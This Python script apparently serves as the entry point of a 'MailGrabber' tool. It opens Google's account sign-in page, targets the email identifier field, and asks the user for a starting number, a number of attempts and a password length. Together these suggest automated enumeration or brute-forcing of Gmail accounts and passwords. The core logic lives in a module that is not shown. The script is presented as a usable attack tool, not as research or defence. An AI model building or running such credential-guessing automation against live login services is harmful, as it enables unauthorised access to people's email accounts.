from src.MailGrabber import MailGrabber
import time
from src.const import GMAIL_URL, PASSWORD_URL

with MailGrabber() as mail:
    mail.show_intro()
    mail.instructions()
    mail.go_to_gmail(
        "https://accounts.google.com/v3/signin/identifier?dsh=S-369070831%3A1679585500716875&continue=https%3A%2F"
        "%2Faccounts.google.com%2Fb%2F0%2FAddMailService&followup=https%3A%2F%2Faccounts.google.com%2Fb%2F0"
        "%2FAddMailService&ifkv=AQMjQ7TWf32A8kc6niDClOCjuzw-PYP67_WS1ME8K_e8iWEwdKPidWSCv90mKji3rAcE7pZaIetGpw"
        "&passive=1209600&flowName=GlifWebSignIn&flowEntry=ServiceLogin "
    )

    mail.start_grabbing("//input[@id='identifierId']", input("\033[32m" + "Enter a starting number => " + "\033[0m"),
                        int(input("\033[32m" + "How many time do you want to keep trying? => " + "\033[0m")),
                        int(input("\033[32m" + "Set a length of password => " + "\033[0m")))
